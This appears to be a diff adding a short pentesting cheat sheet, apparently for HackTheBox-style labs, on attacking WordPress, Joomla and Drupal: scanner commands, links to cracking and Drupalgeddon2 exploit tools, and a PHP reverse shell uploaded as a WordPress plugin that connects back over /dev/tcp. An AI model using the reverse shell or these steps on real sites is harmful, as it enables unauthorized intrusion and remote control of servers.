@@ -1,0 +1,48 @@
+<h1 id="1-wordpress">1 Wordpress</h1>
+<hr />
+
+<h2 id="wpscan">wpscan</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  wpscan --url http://sandbox.local  --enumerate ap,at,cb,dbe -o sandbox.out
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ./wpscan –url http://IP/ –enumerate p
+</code></pre></div></div>
+<p>a veces conviene usar el modo agressive de wpscan</p>
+
+<h2 id="wordpress-password-cracker">wordpress password cracker</h2>
+
+<p>https://github.com/MrSqar-Ye/wpCrack.git</p>
+
+<h2 id="wordpress-reverse-shell-admin-panel">wordpress reverse shell admin panel</h2>
+<ol>
+  <li>create php code</li>
+</ol>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nb">exec</span><span class="p">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.86.99/443 0&gt;&amp;1'"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<ol>
+  <li>zip the php</li>
+  <li>upload the zip as plugin</li>
+  <li>activate plugin</li>
+</ol>
+
+<h1 id="2-joomla">2 Joomla</h1>
+<hr />
+<p>ip/administrator/manifests/files/joomla.xml &lt;- te da la version</p>
+
+<h2 id="joomscan">joomscan</h2>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joomscan -ec -u  http://curling.htb
+</code></pre></div></div>
+
+<h1 id="3-drupal">3 DRUPAL</h1>
+<hr />
+<p>https://github.com/dreadlocked/Drupalgeddon2</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>droopescan scan drupal -u 10.10.10.102:80 
+</code></pre></div></div>
